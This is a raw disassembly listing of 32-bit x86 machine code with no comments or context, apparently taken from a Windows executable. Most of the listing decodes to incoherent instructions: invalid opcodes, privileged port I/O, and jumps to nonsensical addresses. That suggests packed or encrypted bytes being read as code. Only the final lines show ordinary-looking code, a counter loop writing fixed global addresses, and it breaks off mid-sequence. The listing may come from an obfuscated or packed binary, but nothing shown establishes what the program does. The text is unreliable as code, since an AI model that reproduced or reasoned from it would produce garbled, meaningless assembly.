  41382a:	idiv   BYTE PTR [eax+ebx*8-0x25]
  41382e:	dec    eax
  41382f:	pop    eax
  413830:	int3   
  413831:	in     al,dx
  413832:	mul    BYTE PTR [eax]
  413834:	repz mov cl,dl
  413837:	sub    eax,0xb0b5769d
  41383c:	(bad)  
  41383d:	jge    0x413834
  41383f:	jae    0x41386f
  413841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413842:	ret    
  413843:	pop    ss
  413844:	jmp    0x634fae81
  413849:	push   esi
  41384a:	int    0xc1
  41384c:	dec    ecx
  41384d:	and    dh,BYTE PTR [eax-0x5e]
  413850:	mov    ebp,0xf1fa94a5
  413855:	loop   0x413867
  413857:	jae    0x4138ae
  413859:	fsubr  DWORD PTR [esi-0xe317fb2]
  41385f:	addr16 lahf 
  413861:	mov    WORD PTR ds:0x27a43a2b,ss
  413867:	mov    al,ds:0x2a2f343d
  41386c:	mov    ch,0x60
  41386e:	lea    ecx,[edx+eiz*1-0x3e]
  413872:	out    dx,eax
  413873:	push   ecx
  413874:	sbb    ebp,ebx
  413876:	or     eax,0xf2c2dff0
  41387b:	std    
  41387c:	pop    ecx
  41387d:	sub    ch,dh
  41387f:	pushf  
  413880:	jmp    0x69dd6278
  413885:	imul   ecx,DWORD PTR [edx+eax*8-0x7813b896],0x7f
  41388d:	fcomp  DWORD PTR [eax+edx*4+0x9]
  413891:	test   al,0xf8
  413893:	adc    eax,0xc53b2654
  413898:	data16 clc 
  41389a:	mov    ch,0xd1
  41389c:	inc    edx
  41389d:	lock push ds
  41389f:	scas   eax,DWORD PTR es:[edi]
  4138a0:	cs dec esi
  4138a2:	push   ss
  4138a3:	add    bh,bl
  4138a5:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4138a7:	mov    bh,0x2
  4138a9:	daa    
  4138aa:	cwde   
  4138ab:	mov    eax,ds:0x8e7bb616
  4138b0:	inc    edx
  4138b1:	out    dx,eax
  4138b2:	ror    BYTE PTR [edx+0x9317f31],1
  4138b8:	push   edx
  4138b9:	pusha  
  4138ba:	test   al,0x0
  4138bc:	push   edi
  4138bd:	dec    eax
  4138be:	iret   
  4138bf:	shr    DWORD PTR [esi],cl
  4138c1:	(bad)  
  4138c2:	cli    
  4138c3:	and    DWORD PTR [esi-0x38e01352],ebx
  4138c9:	out    dx,al
  4138ca:	dec    ecx
  4138cb:	push   edi
  4138cc:	jnp    0x4138eb
  4138ce:	xor    eax,0x9890197d
  4138d3:	sub    edi,ecx
  4138d5:	jg     0x41393d
  4138d7:	hlt    
  4138d8:	es cli 
  4138da:	dec    DWORD PTR [esi+0x4fba09d1]
  4138e0:	test   ecx,ebp
  4138e2:	push   edi
  4138e3:	jb     0x41392b
  4138e5:	rcl    BYTE PTR [ecx],1
  4138e7:	or     bh,BYTE PTR [edi]
  4138e9:	(bad)  
  4138ea:	sbb    eax,0xd331fbec
  4138ef:	(bad)  
  4138f0:	jecxz  0x413965
  4138f2:	dec    ebp
  4138f3:	in     eax,0xb0
  4138f5:	add    edx,ebp
  4138f7:	push   edi
  4138f8:	dec    eax
  4138f9:	sbb    al,0x9
  4138fb:	aam    0xe2
  4138fd:	and    eax,0x4c672ce1
  413902:	cmp    al,BYTE PTR [esi+0x75]
  413905:	aas    
  413906:	lock dec ebx
  413908:	sub    DWORD PTR [ebp-0x63],0xffffffb3
  41390c:	dec    ebp
  41390d:	aad    0x96
  41390f:	adc    al,0x6d
  413911:	push   esp
  413912:	mov    ds:0x50949f16,al
  413917:	or     ebx,DWORD PTR [esi+ebp*2+0x16]
  41391b:	adc    DWORD PTR [edi+0x1d84b962],edi
  413921:	push   ss
  413922:	jg     0x41394d
  413924:	add    eax,0x2c340a3b
  413929:	int3   
  41392a:	mov    cl,0x74
  41392c:	xchg   eax,esp
  41392e:	jg     0x4138c6
  413930:	or     eax,0xb4168fc3
  413935:	and    BYTE PTR [esi-0x45],0x84
  413939:	pop    edi
  41393a:	sub    al,0xd6
  41393c:	sahf   
  41393d:	loopne 0x413997
  41393f:	inc    ecx
  413940:	pandn  mm2,mm7
  413943:	int3   
  413944:	mov    ds:0xf4c0b1d4,al
  413949:	pop    ds
  41394a:	dec    ebx
  41394b:	popf   
  41394c:	pop    ebp
  41394d:	jge    0x4138ff
  41394f:	jnp    0x413991
  413951:	add    DWORD PTR [edx+0x6b8ca0f8],esi
  413957:	test   ch,0xb0
  41395a:	cdq    
  41395b:	sti    
  41395c:	inc    esi
  41395d:	js     0x413986
  41395f:	xchg   esp,eax
  413960:	mov    bh,0x4
  413962:	or     bh,dl
  413964:	pop    ebx
  413965:	xor    al,0x35
  413967:	(bad)  
  413968:	xlat   BYTE PTR ds:[ebx]
  413969:	aas    
  41396a:	repnz cli 
  41396c:	stos   WORD PTR es:[edi],ax
  41396e:	(bad)  
  41396f:	stos   DWORD PTR es:[edi],eax
  413970:	mov    ebx,0xe48f33d7
  413975:	mov    bl,0x1d
  413977:	dec    ecx
  413978:	ins    DWORD PTR es:[edi],dx
  413979:	in     al,0x35
  41397b:	xchg   ebp,eax
  41397c:	rcl    bl,cl
  41397e:	adc    al,0xc0
  413980:	push   ebx
  413981:	inc    ebp
  413982:	jle    0x41393b
  413984:	mov    DWORD PTR [ebx],eax
  413986:	xchg   edi,edx
  413988:	xchg   esi,eax
  413989:	push   cs
  41398a:	cdq    
  41398b:	dec    ebp
  41398c:	adc    bh,BYTE PTR [ebx+esi*4+0x4de544c2]
  413993:	repnz bswap esi
  413996:	jne    0x413981
  413998:	jmp    0x92a61561
  41399d:	sub    al,0xa5
  41399f:	push   ecx
  4139a0:	xchg   BYTE PTR [edx-0x3c],ch
  4139a3:	fild   WORD PTR [ebp*4+0x42ac2b29]
  4139aa:	push   es
  4139ab:	scas   al,BYTE PTR es:[edi]
  4139ac:	pop    edx
  4139ad:	gs mov eax,0xb154ab24
  4139b3:	jb     0x4139b8
  4139b5:	pop    edi
  4139b6:	cld    
  4139b7:	xchg   DWORD PTR [edi+eiz*4+0x69],esi
  4139bb:	sbb    al,0x70
  4139bd:	pop    ss
  4139be:	loope  0x413999
  4139c0:	inc    esi
  4139c1:	inc    ebx
  4139c2:	push   esi
  4139c3:	shr    bl,0x62
  4139c6:	lds    esp,FWORD PTR [esi-0x2a]
  4139c9:	es xor al,0x65
  4139cc:	bound  esi,QWORD PTR [eax]
  4139ce:	adc    al,0xc0
  4139d0:	push   es
  4139d1:	cwde   
  4139d2:	mov    ebx,0x989b2269
  4139d7:	push   esi
  4139d8:	adc    edi,DWORD PTR [edx+eiz*4+0x65]
  4139dc:	mov    ds:0xa7c3c98b,al
  4139e1:	mov    DWORD PTR [ecx-0x7b],edx
  4139e4:	mov    ?,WORD PTR [esi-0x7d167d59]
  4139ea:	adc    BYTE PTR [ecx+eiz*8-0x58],0xcf
  4139ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f0:	and    bh,BYTE PTR [ebp+0x3da7460a]
  4139f6:	jns    0x413994
  4139f8:	repnz daa 
  4139fa:	dec    ebx
  4139fb:	sahf   
  4139fc:	loopne 0x413a18
  4139fe:	bound  ebx,QWORD PTR [eax+esi*4]
  413a01:	push   edi
  413a02:	cmp    ch,al
  413a04:	add    DWORD PTR [ebx],0x5
  413a07:	push   ecx
  413a08:	(bad)  
  413a09:	jp     0x413a26
  413a0b:	adc    dl,bl
  413a0d:	in     eax,dx
  413a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a0f:	dec    ebp
  413a10:	scas   eax,DWORD PTR es:[edi]
  413a11:	hlt    
  413a12:	(bad)  
  413a13:	sub    bh,ch
  413a15:	daa    
  413a16:	mov    al,0xde
  413a18:	aaa    
  413a19:	xor    BYTE PTR [edi-0x5],ch
  413a1c:	(bad)  
  413a1d:	push   esp
  413a1e:	push   cs
  413a1f:	dec    esp
  413a20:	lahf   
  413a21:	adc    al,0xb2
  413a23:	sub    BYTE PTR [ecx+0xc223e8a],dl
  413a29:	lds    eax,FWORD PTR [eax+0x48]
  413a2c:	mov    edi,DWORD PTR [eax]
  413a2e:	xchg   ebx,eax
  413a2f:	call   0x1115b63
  413a34:	inc    eax
  413a35:	mov    DWORD PTR ds:0x487f17f0,esp
  413a3b:	dec    ecx
  413a3c:	sub    cl,bh
  413a3e:	aas    
  413a3f:	into   
  413a40:	cli    
  413a41:	push   eax
  413a42:	arpl   WORD PTR [ecx+0x351f9a6d],ax
  413a48:	fmul   st,st(7)
  413a4a:	push   bp
  413a4c:	imul   eax,eax,0x39a17d48
  413a52:	int    0x8b
  413a54:	adc    DWORD PTR [ebx+esi*8+0x175d047c],ebp
  413a5b:	int    0xa5
  413a5d:	xchg   DWORD PTR [edi],ecx
  413a5f:	sub    al,0x50
  413a61:	push   ebx
  413a62:	stos   BYTE PTR es:[edi],al
  413a63:	ret    0x4707
  413a66:	and    al,0xf6
  413a68:	fsubr  QWORD PTR [eax+0x17]
  413a6b:	xor    ax,0xfdc6
  413a6f:	mov    eax,ds:0x122f5509
  413a74:	pusha  
  413a75:	mov    bl,bl
  413a77:	neg    bl
  413a79:	out    0x6e,al
  413a7b:	xor    al,0xf4
  413a7d:	xchg   ax,ax
  413a7f:	xor    eax,0x77105859
  413a84:	in     al,0x85
  413a86:	psubd  mm4,QWORD PTR [edi-0x309a5a8f]
  413a8d:	mov    eax,ds:0x22c718f
  413a92:	lods   al,BYTE PTR ds:[esi]
  413a93:	pusha  
  413a94:	add    DWORD PTR [ebx],ebx
  413a96:	in     eax,0x30
  413a98:	push   cs
  413a99:	xchg   ebp,eax
  413a9a:	mov    dh,0xb6
  413a9c:	dec    esp
  413a9d:	(bad)  
  413a9e:	cli    
  413a9f:	out    dx,eax
  413aa0:	retf   
  413aa1:	jmp    0x90e5aa68
  413aa6:	push   ebp
  413aa7:	pop    ss
  413aa8:	cmp    al,0x5e
  413aaa:	jne    0x413a4e
  413aac:	push   eax
  413aad:	retf   0xc860
  413ab0:	pop    eax
  413ab1:	js     0x413a79
  413ab3:	xor    eax,0x38dc656
  413ab8:	stos   BYTE PTR es:[edi],al
  413ab9:	push   ss
  413aba:	push   ss
  413abb:	ror    BYTE PTR [esi+eiz*2],1
  413abe:	mov    ebx,0xd6de9d52
  413ac3:	sbb    eax,DWORD PTR [ebx+ebx*2-0x2d]
  413ac7:	loopne 0x413adb
  413ac9:	jg     0x413b0b
  413acb:	in     al,0xca
  413acd:	fadd   QWORD PTR [esi+0x32c1ac5f]
  413ad3:	sti    
  413ad4:	xchg   edi,eax
  413ad5:	push   ebp
  413ad6:	mov    eax,?
  413ad8:	xor    eax,0xdfab0c1d
  413add:	mov    ds:0xcdcc2e80,eax
  413ae2:	pop    esp
  413ae3:	jge    0x413a65
  413ae5:	xor    ch,dh
  413ae7:	aad    0xef
  413ae9:	cmc    
  413aea:	xchg   ecx,ebp
  413aec:	(bad)  
  413aed:	call   0x95a17e86
  413af2:	loope  0x413a93
  413af4:	push   es
  413af5:	add    cl,bl
  413af7:	adc    al,bh
  413af9:	nop
  413afa:	shl    eax,cl
  413afc:	pop    es
  413afd:	daa    
  413afe:	mov    esp,0x6548c8c5
  413b03:	sbb    esi,DWORD PTR [edx-0x1c2acdb0]
  413b09:	inc    edi
  413b0a:	div    bl
  413b0c:	or     BYTE PTR [edx-0x28],0x84
  413b10:	rcr    BYTE PTR [ebx],cl
  413b12:	nop    DWORD PTR [esi-0x1b46570b]
  413b19:	jns    0x413ac5
  413b1b:	mov    esp,0xb348c66f
  413b20:	fwait
  413b21:	imul   esp,DWORD PTR [ebx-0x3a],0x30
  413b25:	sub    eax,0xbcb128df
  413b2a:	std    
  413b2b:	pop    edx
  413b2c:	sub    al,0xbd
  413b2e:	das    
  413b2f:	dec    edx
  413b30:	mov    bl,0x91
  413b32:	mov    eax,gs:0xb37db305
  413b38:	fs mov ebp,0x5c8b5023
  413b3e:	ret    
  413b3f:	jmp    0x6230ac3d
  413b44:	pop    ecx
  413b45:	xchg   ecx,eax
  413b46:	nop
  413b47:	or     edx,DWORD PTR [esi]
  413b49:	leave  
  413b4a:	iret   
  413b4b:	and    al,0xaa
  413b4d:	js     0x413b8c
  413b4f:	daa    
  413b50:	fadd   QWORD PTR [ecx+0x333343fa]
  413b56:	shl    DWORD PTR [edx+0x0],0x83
  413b5a:	test   BYTE PTR [eax],ah
  413b5c:	in     eax,dx
  413b5d:	fiadd  DWORD PTR [edi+0x65]
  413b60:	test   dl,al
  413b62:	mov    bl,0xca
  413b64:	xor    eax,0xfe83fe57
  413b69:	push   cs
  413b6a:	mov    ds:0xcff54ae,al
  413b6f:	cs and al,0x65
  413b72:	and    eax,0xa1190db5
  413b77:	imul   ebx,DWORD PTR [edi+0x530d8f29],0x369583ab
  413b81:	mov    edx,DWORD PTR [edx+0x22]
  413b84:	in     eax,0x2c
  413b86:	push   esp
  413b87:	mov    dh,0xf1
  413b89:	cli    
  413b8a:	add    BYTE PTR [ecx],0xce
  413b8d:	out    0x53,al
  413b8f:	js     0x413bf5
  413b91:	fsubr  QWORD PTR [edi]
  413b93:	push   cs
  413b94:	mov    dl,BYTE PTR [edi]
  413b96:	sub    al,0x31
  413b98:	add    eax,0x308096dd
  413b9d:	jmp    0x560e:0x44cddd05
  413ba4:	push   ebx
  413ba5:	out    dx,eax
  413ba6:	or     ecx,DWORD PTR [ecx-0x24]
  413ba9:	xchg   esi,eax
  413baa:	and    esp,ecx
  413bac:	and    al,0x96
  413bae:	jns    0x413b8c
  413bb0:	pop    ecx
  413bb1:	shl    BYTE PTR [esi],cl
  413bb3:	adc    BYTE PTR [ebp-0x3279d83],bl
  413bb9:	jnp    0x413bdc
  413bbb:	cmp    esp,DWORD PTR [esp+eiz*8+0x539acf12]
  413bc2:	int3   
  413bc3:	sahf   
  413bc4:	push   ss
  413bc5:	ret    
  413bc6:	aad    0xdd
  413bc8:	addr16 out dx,al
  413bca:	add    eax,0x60a60d7a
  413bcf:	addr16 stc 
  413bd1:	inc    ebp
  413bd2:	test   BYTE PTR [ecx],bh
  413bd4:	pushf  
  413bd5:	inc    eax
  413bd6:	shl    DWORD PTR [esi],0x20
  413bd9:	cmp    al,0xe5
  413bdb:	pop    esp
  413bdc:	test   ecx,esp
  413bde:	nop
  413bdf:	mov    ah,0xd7
  413be1:	mov    cl,0x2e
  413be3:	mov    al,ds:0x9f51e338
  413be8:	push   0xffffff90
  413bea:	push   ebp
  413beb:	aaa    
  413bec:	pop    edx
  413bed:	retf   
  413bee:	and    eax,0xd58175b
  413bf3:	pop    ebx
  413bf4:	cs out dx,al
  413bf6:	sar    DWORD PTR [edx-0x23],1
  413bf9:	or     ch,BYTE PTR [edi]
  413bfb:	loope  0x413b84
  413bfd:	cmp    al,0xaf
  413bff:	jge    0x413bd3
  413c01:	and    ebp,DWORD PTR [ecx]
  413c03:	rcr    BYTE PTR [esi+0x73345b1d],cl
  413c09:	mov    dl,0x7f
  413c0b:	repz mov eax,DWORD PTR [edx]
  413c0e:	sbb    al,0xe4
  413c10:	xchg   ecx,eax
  413c11:	mov    ds:0xe15490a0,eax
  413c16:	cdq    
  413c17:	push   ss
  413c18:	jnp    0x413c25
  413c1a:	xor    dl,bh
  413c1c:	ret    
  413c1d:	xor    al,0x52
  413c1f:	dec    ebx
  413c20:	(bad)  
  413c21:	xchg   esp,eax
  413c22:	call   0xee8b:0xe226e3a4
  413c29:	jbe    0x413bad
  413c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c2c:	(bad)  
  413c2d:	sahf   
  413c2e:	sbb    eax,0x59bb04ed
  413c33:	dec    ecx
  413c34:	inc    ebx
  413c35:	cmp    esp,0xeed60f69
  413c3b:	rcr    DWORD PTR [esi+0xd],cl
  413c3e:	jb     0x413c59
  413c40:	cwde   
  413c41:	scas   al,BYTE PTR es:[edi]
  413c42:	and    eax,0xe15e3dd4
  413c47:	mov    cl,0x25
  413c49:	rol    BYTE PTR [ebx],0x3c
  413c4c:	push   eax
  413c4d:	lods   al,BYTE PTR ds:[esi]
  413c4e:	mov    al,ds:0xd8b91427
  413c53:	adc    DWORD PTR [esi-0x5a],edx
  413c56:	(bad)  
  413c57:	das    
  413c58:	mov    es,WORD PTR [edi-0x12]
  413c5b:	dec    ebp
  413c5c:	test   eax,0x1be48cb6
  413c61:	add    BYTE PTR [ecx+ecx*2],dh
  413c64:	sub    al,0x85
  413c66:	mov    ds:0x1529fb12,eax
  413c6b:	popf   
  413c6c:	inc    edi
  413c6d:	xor    BYTE PTR [esi+0x3b],ch
  413c70:	ror    DWORD PTR [eax-0x37b8fdf2],1
  413c76:	inc    eax
  413c77:	push   ebp
  413c78:	outs   dx,DWORD PTR ds:[esi]
  413c79:	sbb    edx,ebx
  413c7b:	ret    0xf67
  413c7e:	dec    edx
  413c7f:	das    
  413c80:	arpl   bx,cx
  413c82:	cmp    al,0x28
  413c84:	jbe    0x413c53
  413c86:	vpmulhuw xmm5,xmm2,XMMWORD PTR [eax]
  413c8a:	sbb    bl,BYTE PTR [edi+eiz*2-0x11]
  413c8e:	out    0xb4,al
  413c90:	inc    esi
  413c91:	cmp    esp,DWORD PTR [ebp+0x1f]
  413c94:	adc    DWORD PTR [ebp+edx*1-0x74],esi
  413c98:	or     eax,0xc0504dcd
  413c9d:	fdivr  DWORD PTR [edx]
  413c9f:	mov    dl,bl
  413ca1:	pop    ss
  413ca2:	test   al,0x3b
  413ca4:	xchg   BYTE PTR [ebx+ebp*1-0x135b49b8],dl
  413cab:	pushf  
  413cac:	inc    edi
  413cad:	fimul  DWORD PTR [esi]
  413caf:	pop    esp
  413cb0:	test   eax,0xc5b1dcd2
  413cb5:	not    edx
  413cb7:	add    cl,BYTE PTR [ebx-0x1a]
  413cba:	cmp    ebx,esi
  413cbc:	in     eax,dx
  413cbd:	ret    
  413cbe:	mov    ds,WORD PTR [ecx]
  413cc0:	das    
  413cc1:	jo     0x413cfa
  413cc3:	sahf   
  413cc4:	xchg   ebx,eax
  413cc5:	mov    DWORD PTR [edx+edx*1],esi
  413cc8:	or     eax,esi
  413cca:	mov    edx,0x565157cc
  413ccf:	and    eax,0x75b7ba8b
  413cd4:	je     0x413cff
  413cd6:	test   al,0x4a
  413cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cd9:	push   ss
  413cda:	outs   dx,DWORD PTR ds:[esi]
  413cdb:	push   esp
  413cdc:	adc    al,0x72
  413cde:	and    eax,DWORD PTR [eax]
  413ce0:	inc    esp
  413ce1:	or     DWORD PTR [edi],ebp
  413ce3:	mov    eax,ss
  413ce5:	jl     0x413d32
  413ce7:	test   al,0x6b
  413ce9:	push   edx
  413cea:	test   eax,0x3f978042
  413cef:	mov    WORD PTR [eax-0x7c],?
  413cf2:	inc    ecx
  413cf3:	mov    ds:0x1a0c2efd,eax
  413cf8:	lahf   
  413cf9:	(bad)
  413cfd:	sti    
  413cfe:	ins    DWORD PTR es:[edi],dx
  413cff:	jno    0x413c89
  413d01:	add    eax,0x6a07c04b
  413d06:	jb     0x413cb7
  413d08:	std    
  413d09:	out    0x2d,eax
  413d0b:	adc    BYTE PTR [edx-0x16],cl
  413d0e:	mov    WORD PTR [esp-0x4d4a890e],cs
  413d15:	xchg   BYTE PTR [ecx+0x585bad6f],ch
  413d1b:	sub    esi,0xffffffa6
  413d1e:	pushf  
  413d1f:	xor    dh,bh
  413d21:	retf   
  413d22:	mov    ebx,0xfa827e8c
  413d27:	and    BYTE PTR [ecx],ah
  413d29:	add    ah,cl
  413d2b:	mov    al,0x73
  413d2d:	fwait
  413d2e:	ss (bad) 
  413d30:	mov    al,ds:0xd8947a9e
  413d35:	sub    eax,0xd3e7d0a5
  413d3a:	mov    bh,0x90
  413d3c:	jmp    0x6d277f55
  413d41:	dec    ebp
  413d42:	dec    edi
  413d43:	dec    edx
  413d44:	data16 cld 
  413d46:	mov    ebp,?
  413d48:	jnp    0x413db5
  413d4a:	xor    eax,0xf530a701
  413d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d50:	mov    esi,0x5dccaba1
  413d55:	ds test al,0xdd
  413d58:	pop    ss
  413d59:	enter  0xa40d,0x79
  413d5d:	push   ecx
  413d5e:	imul   ebx,DWORD PTR [eax+edx*8-0x65223417],0xffffffd9
  413d66:	loop   0x413d1a
  413d68:	mov    ah,0xa1
  413d6a:	pop    es
  413d6b:	sbb    DWORD PTR [esi+0x7864dbbe],eax
  413d71:	loop   0x413d72
  413d73:	hlt    
  413d74:	add    edx,ebp
  413d76:	aaa    
  413d77:	std    
  413d78:	(bad)  
  413d79:	jle    0x413da7
  413d7b:	and    ecx,DWORD PTR [eax-0x9cddb8f]
  413d81:	inc    ebp
  413d82:	mov    esp,0x356b6317
  413d87:	je     0x413d69
  413d89:	push   ebx
  413d8a:	call   0x4fe4:0xd1d66b58
  413d91:	add    eax,0xa8bbbf94
  413d96:	test   DWORD PTR ds:0xdbd7fe4d,edx
  413d9c:	call   0x50dc:0xd84ea94e
  413da3:	out    dx,eax
  413da4:	cld    
  413da5:	mov    esi,0xe989b8ed
  413daa:	fstp   QWORD PTR [edi-0x3c8b1031]
  413db0:	aaa    
  413db1:	out    0x2,eax
  413db3:	call   DWORD PTR [eax]
  413db5:	cld    
  413db6:	push   ds
  413db7:	sbb    eax,0x87d25216
  413dbc:	frstor [edi-0x4b678f5e]
  413dc2:	ret    0x9bd0
  413dc5:	aam    0x4a
  413dc7:	frstor es:[ecx-0x30]
  413dcb:	mov    WORD PTR [ecx],cs
  413dcd:	pushf  
  413dce:	cmp    BYTE PTR [ecx-0x71],bl
  413dd1:	sar    ebp,1
  413dd3:	push   0xffffffa9
  413dd5:	leave  
  413dd6:	xchg   esi,eax
  413dd7:	pushf  
  413dd8:	push   es
  413dd9:	xchg   ebp,eax
  413dda:	mov    bl,0x43
  413ddc:	fidivr DWORD PTR [eax-0x75fc84f0]
  413de2:	lahf   
  413de3:	leave  
  413de4:	loope  0x413db5
  413de6:	fst    QWORD PTR [esi-0x4]
  413de9:	jg     0x413e2e
  413deb:	iret   
  413dec:	cwde   
  413ded:	retf   0x4b4a
  413df0:	in     al,0xb9
  413df2:	inc    ebp
  413df3:	jbe    0x413e15
  413df5:	jb     0x413e4c
  413df7:	ins    BYTE PTR es:[edi],dx
  413df8:	je     0x413d91
  413dfa:	jge    0x413e43
  413dfc:	pop    esp
  413dfd:	js     0x413e43
  413dff:	test   BYTE PTR [ebp+0x31e1dee3],0x79
  413e06:	sub    edi,DWORD PTR [esi-0x44ac71f3]
  413e0c:	int3   
  413e0d:	inc    eax
  413e0e:	mov    eax,ds:0x43073766
  413e13:	mov    ds:0xf891ff2c,al
  413e18:	mov    eax,fs
  413e1a:	loope  0x413dd0
  413e1c:	fsubr  QWORD PTR [ecx*4-0x59bb72a]
  413e23:	ficom  DWORD PTR [ebp+0x44191bf4]
  413e29:	(bad)  
  413e2a:	nop
  413e2b:	inc    eax
  413e2c:	add    ch,ch
  413e2e:	cdq    
  413e2f:	jbe    0x413db5
  413e31:	sbb    ah,BYTE PTR [esi+ebp*8]
  413e34:	fbstp  TBYTE PTR [esi-0x61f027cb]
  413e3a:	push   0xec3d24c1
  413e3f:	xchg   BYTE PTR [ebx-0xf],bh
  413e42:	jmp    0x413e63
  413e44:	test   BYTE PTR [edx],ah
  413e46:	neg    eax
  413e48:	xor    dl,dl
  413e4a:	in     eax,dx
  413e4b:	fmul   st(4),st
  413e4d:	aas    
  413e4e:	jg     0x413e41
  413e50:	aas    
  413e51:	call   0x156a83c3
  413e56:	inc    eax
  413e57:	mov    ds:0xc7624d4b,eax
  413e5c:	push   ebx
  413e5d:	pop    eax
  413e5e:	or     BYTE PTR [ebx-0x2a760c87],al
  413e64:	or     DWORD PTR [esi+0x58],ebp
  413e67:	sub    cl,dh
  413e69:	adc    esp,DWORD PTR [ecx]
  413e6b:	pushf  
  413e6c:	mov    bh,0x27
  413e6e:	fist   WORD PTR [esi]
  413e70:	js     0x413e5d
  413e72:	or     BYTE PTR [eax-0x59],0x5e
  413e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e77:	or     dh,BYTE PTR [edx-0x74]
  413e7a:	fsubr  DWORD PTR [edx-0x24]
  413e7d:	dec    edi
  413e7e:	repnz push esi
  413e80:	cli    
  413e81:	jae    0x413eaf
  413e83:	add    dl,ah
  413e85:	add    BYTE PTR ds:0xfb4fe8fe,0xf1
  413e8c:	mov    edx,0xb25c47e
  413e91:	(bad)  
  413e92:	(bad)  
  413e94:	sbb    eax,0xbc06f0c4
  413e99:	push   ss
  413e9a:	(bad)  
  413e9b:	in     al,0x6a
  413e9d:	push   ecx
  413e9e:	lea    esp,[ebp-0x5b]
  413ea1:	fbstp  TBYTE PTR [eax]
  413ea3:	push   ss
  413ea4:	cmp    al,0x96
  413ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ea7:	jb     0x413e55
  413ea9:	mov    ds,WORD PTR [ebx+ebp*1-0x137e726b]
  413eb0:	mov    al,0x2e
  413eb2:	js     0x413e84
  413eb4:	sbb    al,0xe8
  413eb6:	sti    
  413eb7:	(bad)  
  413eb8:	(bad)  
  413eb9:	(bad)  
  413eba:	xchg   BYTE PTR [ebx],ah
  413ebc:	adc    dh,ch
  413ebe:	mov    ebx,0xa5d6cfee
  413ec3:	sahf   
  413ec4:	call   0xea18c6f8
  413ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413eca:	aas    
  413ecb:	mov    ebx,0x130ddc2e
  413ed0:	ins    BYTE PTR es:[edi],dx
  413ed1:	stos   DWORD PTR es:[edi],eax
  413ed2:	xor    al,0x20
  413ed4:	cmp    eax,0xb784beb7
  413ed9:	pop    ss
  413eda:	xor    al,0x22
  413edc:	xor    DWORD PTR [eax+0x88a743a],ecx
  413ee2:	into   
  413ee3:	mov    al,BYTE PTR [esi]
  413ee5:	push   0xfffffff0
  413ee7:	pop    es
  413ee8:	aad    0x91
  413eea:	xor    DWORD PTR [edi+0x3e],edi
  413eed:	stos   DWORD PTR es:[edi],eax
  413eee:	sub    eax,0xb6261f4b
  413ef3:	xchg   ecx,eax
  413ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ef5:	aad    0x2b
  413ef7:	jl     0x413eac
  413ef9:	push   edi
  413efa:	lods   al,BYTE PTR ds:[esi]
  413efb:	and    eax,0x5da79721
  413f00:	mov    edx,ecx
  413f02:	dec    esp
  413f03:	or     ah,0x56
  413f06:	repnz or DWORD PTR [esi+edx*2],esp
  413f0a:	xchg   ebx,eax
  413f0b:	arpl   WORD PTR [ecx+eiz*1+0x59],ax
  413f0f:	mov    ebx,0xf16f4bd5
  413f14:	(bad)  
  413f15:	xchg   esp,eax
  413f16:	xor    BYTE PTR [eax],dh
  413f18:	xor    al,0x3d
  413f1a:	add    ah,BYTE PTR [edi-0x46]
  413f1d:	push   0x21
  413f1f:	mov    al,0xa
  413f21:	(bad)  
  413f22:	rol    dl,cl
  413f24:	lock cdq 
  413f26:	std    
  413f27:	shr    BYTE PTR [eax+edi*1],0xe7
  413f2b:	xchg   ebx,eax
  413f2c:	ficomp DWORD PTR [ebx+0x1b]
  413f2f:	xchg   edi,eax
  413f30:	xor    bl,ch
  413f32:	pop    es
  413f33:	mov    eax,ds:0xf7bf5654
  413f39:	scas   al,BYTE PTR es:[edi]
  413f3a:	inc    esp
  413f3b:	out    dx,al
  413f3c:	adc    eax,0xa4f2b748
  413f41:	into   
  413f42:	pop    es
  413f43:	xchg   ebx,eax
  413f44:	pop    es
  413f45:	div    DWORD PTR [ebx]
  413f47:	ds xor bl,bl
  413f4a:	iret   
  413f4b:	pop    eax
  413f4c:	push   ebp
  413f4d:	arpl   WORD PTR [ecx],si
  413f4f:	jp     0x413f8f
  413f51:	fwait
  413f52:	jg     0x413f0f
  413f54:	and    BYTE PTR [ebx],dl
  413f56:	xor    al,0x11
  413f58:	add    BYTE PTR [edx],cl
  413f5a:	mov    dh,0xcc
  413f5c:	call   0xf6e5503d
  413f61:	xchg   esi,eax
  413f62:	fldz   
  413f64:	cwde   
  413f65:	xchg   ecx,eax
  413f66:	stc    
  413f67:	(bad)  
  413f68:	xlat   BYTE PTR ds:[ebx]
  413f69:	xchg   ebx,eax
  413f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f6b:	fisub  DWORD PTR [esi+eax*8-0x52]
  413f6f:	xor    edx,eax
  413f71:	xor    ebx,eax
  413f73:	xor    DWORD PTR ds:0x42b00c,0x42900c
  413f7d:	sub    edx,ebx
  413f7f:	mov    DWORD PTR ds:0x42b010,0x4d7f
  413f89:	sub    edx,esi
  413f8b:	or     ebx,0x6e50
  413f91:	xor    edx,eax
  413f93:	mov    DWORD PTR ds:0x429008,0x2a34
  413f9d:	mov    DWORD PTR [ebp+0x8],edx
  413fa0:	mov    edx,DWORD PTR [ebp+0x8]
  413fa3:	mov    ebx,DWORD PTR [ebp-0x58]
  413fa6:	add    edx,0x5708f8
  413fac:	or     DWORD PTR ds:0x42c008,0x42c014
  413fb6:	imul   edx,ebx
  413fb9:	and    DWORD PTR ds:0x42d000,0x0
  413fc3:	jmp    0x413fd5
  413fc8:	mov    ebx,DWORD PTR ds:0x42d000
  413fce:	inc    ebx
  413fcf:	mov    DWORD PTR ds:0x42d000,ebx
  413fd5:	cmp    DWORD PTR ds:0x42d000,0x1c
  413fdc:	jae    0x414018
  413fe2:	cmp    DWORD PTR ds:0x42d000,0x1d
  413fe9:	jne    0x41400d
  413fef:	push   DWORD PTR [ebp-0x10]
  413ff2:	push   0x42c004
  413ff7:	push   0x1feb
  413ffc:	push   DWORD PTR [ebp-0x28]
